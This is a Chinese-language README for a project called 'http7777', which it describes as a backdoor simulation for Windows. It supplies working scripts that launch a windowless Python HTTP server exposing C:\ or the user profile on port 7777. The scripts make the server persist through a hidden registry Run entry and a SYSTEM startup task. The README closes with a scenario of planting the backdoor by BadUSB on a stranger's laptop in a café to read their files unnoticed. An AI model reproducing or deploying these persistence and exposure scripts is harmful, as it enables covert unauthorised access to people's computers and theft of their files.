# http7777

http7777, a project to simulate how a backdoor work

## 檔案
```bash
serve_now.ps1                   # 立即開啟 http server 存取端口7777 並展示檔案目錄
taskschd_add.ps1                # 將啟動7777端口展示 C:\ 的動作加入到工作排程器裡
reg_add.ps1                     # 將啟動7777端口展示 %userprofile% 的動作加入到reg
clear_reg_taskschd_all.bat      # 清除所有regedit設定、工作排程器設定、停止 python.exe、pythonw.exe
```

## 提要

`python -m http.server 80`<br>
會使得電腦建立http server，任何人都可通過瀏覽器訪問主機ip，就可以查看當前目錄下的所有檔案

不過 python.exe 會使用到終端機視窗，如果要讓指令在背景執行，就需要用到 pythonw.exe ，它和 python.exe 在同樣的資料夾下，但可以讓程式執行不顯示視窗<br>
但不能直接<br>
`pythonw -m http.server 80` <br>
而是需要建立另外一個腳本<br>
```python
import sys  # 負責處理系統相關參數（如輸入、輸出流）
import os  # 負責處理作業系統功能（如路徑、特殊設備）
from http.server import HTTPServer, SimpleHTTPRequestHandler #  載入 Python 內建的伺服器功能

# 將錯誤與輸出導向到「虛無 (devnull)」，避免 pythonw 因為沒地方印訊息而崩潰
# os.devnull 是一個特殊的路徑，在 Windows 叫做 "NUL"，在 Linux 叫做 "/dev/null"
# 它就像一個「黑洞」，任何丟進去的東西都會消失不見。
sys.stdout = open(os.devnull, 'w') # 把「標準輸出」(原本要印出的訊息) 導向黑洞 'w'寫內容進去
sys.stderr = open(os.devnull, 'w') # # 把「錯誤訊息」(原本報錯的內容) 導向黑洞

# 執行伺服器
# 建立伺服器物件
# ('0.0.0.0', 80) 代表所有電腦都能監聽這台的 IP 位址，並使用 Port 80 (7777)
# SimpleHTTPRequestHandler 則是告訴伺服器：請直接顯示資料夾裡的檔案
server = HTTPServer(('0.0.0.0', 7777), SimpleHTTPRequestHandler)
# 讓伺服器開始永久運行
server.serve_forever()
```
如此一來我們可以濃縮成一行指令:<br>
```bash
pythonw -c "import sys,os;from http.server import HTTPServer,SimpleHTTPRequestHandler;sys.stdout=open(os.devnull,'w');sys.stderr=open(os.devnull,'w');server=HTTPServer(('0.0.0.0',7777),SimpleHTTPRequestHandler);server.serve_forever()"
```
讓終端機隱藏同時不斷的維持 http server

## 使電腦重啟時也跟著啟動指令

在windows電腦中想要重啟之後可以開啟或執行命令<br>
1. 加到 regedit(登錄編輯程式) 的 `電腦\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` 當中，加入regedit不需用管理員權限，不過如果python沒有存取網路的權限這麼做也沒有用，並且只會成功了也只能存取當前的使用者(C:\Users\\[username])，此外這會有一個缺點，在使用者登入時會閃出一瞬間的powershell，雖然幾乎看不到powershell指令內容，但這難免會讓原使用者感到警覺<br>

這是一個矛盾，如果要 python 要存取網路權限，就需要管理員身分的允許，但是使用加入 regedit 的方式就是為了以防使用者不是管理員，不過我一開始想到這個方法時並不知道這點(python存取網路需要管理員允許)，總而言之這個方式基本上是沒有任何用處的，不過我還是將它陳列出來以供參考
```powershell
# 將開啟 7778 端口展示 %userprofile% 的動作加到 regedit 
# 如果python從來沒存取過網路，需要先讓他存取一次
python.exe -c "import os; from http.server import HTTPServer, SimpleHTTPRequestHandler; os.chdir(os.environ['USERPROFILE']); print('activating testing ctrl + c to out...'); server=HTTPServer(('0.0.0.0',7777), SimpleHTTPRequestHandler); server.serve_forever()"
# 將動作加入到 regedit 當中
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$name = "MyPythonServer"
$value = 'powershell.exe -WindowStyle Hidden -Command "Start-Process pythonw.exe -ArgumentList ''-c \"import sys,os;from http.server import HTTPServer,SimpleHTTPRequestHandler;os.chdir(os.environ[''''USERPROFILE'''']); sys.stdout=open(os.devnull,''''w'''');sys.stderr=open(os.devnull,''''w'''');server=HTTPServer((''''0.0.0.0'''',7778),SimpleHTTPRequestHandler);server.serve_forever()\"'' -WindowStyle Hidden"'
Set-ItemProperty -Path $registryPath -Name $name -Value $value
```

2. 加到 taskschd.msc(工作排程器) 中，讓電腦每次重啟或登入都執行工作內容，需要管理員權限，也就是執行命令的層級會是SYSTEM，不過如果當前使用者是管理員的情況下，可以直接使用一般powershell，加入到工作排程器不需要密碼，並且也不會被 Access Denied
```bash
# 將動作加到工作排程器當中，使每次開啟電腦都自動執行命令，存取7777端口開啟伺服器展示C槽，需要管理員權限允許 python 存取網路、taskschd 和 管理員powershell 變更裝置
# 1.找到python位置
$fullPath = (where.exe python)[0]
# AppData\Local\Microsoft\WindowsApps\python.exe 有時候並不是真的 python.exe 無法使用(它是 python 從 Microsoft store 下載時預設的路徑，即使電腦裡沒有任何 python，他也會出現 where python 的結果當中)
if ($fullPath -like "*\WindowsApps\*") {
    Write-Host "偵測到 Microsoft Store 版 Python ($fullPath)" -ForegroundColor Red
}
# 2. 判斷邏輯：如果路徑包含空格 (通常是 Program Files)，就直接用 "python" 
# 反之則使用完整路徑 (因為 AppData/Local/... 通常沒有空格)
# (在系統啟動階段，會找不到安裝在 AppData 下的 python 除非手動指定路徑，與位於 Program Files 的不同)
if ($fullPath -like "* *") {
    $pypath = "python.exe"
} else {
    $pypath = $fullPath
}
# 如果python從來沒存取過網路，需要先讓他存取一次
python.exe -c "import os; from http.server import HTTPServer, SimpleHTTPRequestHandler; os.chdir(os.environ['USERPROFILE']); print('activating testing ctrl + c to out...'); server=HTTPServer(('0.0.0.0',7777), SimpleHTTPRequestHandler); server.serve_forever()"
# 放進排程器裡的字數是有上限的(所以把程式縮減了)
$code = "import sys,os;from http.server import HTTPServer as h,SimpleHTTPRequestHandler as s;os.chdir(''C:/'');sys.stdout=open(os.devnull,''w'');h((''0.0.0.0'',7777),s).serve_forever()"
# 3. 將任務加進排程器裡
Start-Process schtasks -ArgumentList "/create /tn `"MyPythonServer`" /tr `"\`"$pypath\`" -c \`"$code\`"`" /sc onstart /ru system /f" -Verb RunAs
# 4. 立即修改該任務的電源設定 (允許非AC電源時仍然啟動，且換成電池時不停止)
Start-Process powershell -ArgumentList "-Command `"Set-ScheduledTask -TaskName 'MyPythonServer' -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries)`"" -Verb RunAs
```

## 主機需要的條件

1. 需要有安裝全域 python 的主機才能這麼做，無論是安裝在 AppData 下或者 Program Files 都可以<br>
2. 主機上除了 Windows 內建的 Windows Defender 防火牆之外沒有安裝其他防毒軟體(因為大多數防毒軟體會無條件封鎖外來訪問而不是先詢問)<br>
3. 當前使用者是管理員

## 需要檢查的狀況

1. 必須要檢查7777端口有沒有被占用，如果真的不幸被占用就只能選一個其他的數字了<br>
2. python 是不是存在，並且可不可以用<br>
```powershell
ipconfig | findstr IPv4    # 確認內網ip
netstat -ano | findstr 7777  # 檢查7777端口
cmd /c "where python"  # 確認python位置
python --version   # 確認python是否能用
```

如果在試跑server時能夠成功，但用另外的裝置連接該主機ip的7777時連不上，大概率是因為主機上有除了 Windows Defender 之外的防毒軟體正在阻擋來自外來的請求，這個要能夠瞬間解決就有點難了(需要找到是哪個防毒軟體然後手動設定排除規則)<br>

--------------------------------

試想一下，有一位幾乎不用一般使用者而是把管理員當作平日使用帳戶的上班族，同時他的電腦上還安裝了python並設置了全域路徑，又很巧的他安全意識很低沒安裝任何防毒軟體，只有原生的windows defender，你作在咖啡廳的角落，手裡拿著已經寫好程序的BadUSB，等到他走開去上廁所，你意識到有一分鐘的時間，不疾不徐的走到電腦旁邊，開啟powershell，然後將所有寫好的命令輸入在終端、允許python存取網路防火牆、允許工作排程器設定程序、允許管理員powershell執行加入到工作排程器的命令，這樣再在瀏覽器輸入剛剛電腦的ip:7777，你就能夠在本人幾乎察覺不到的情況下，檢視它C槽底下的所有檔案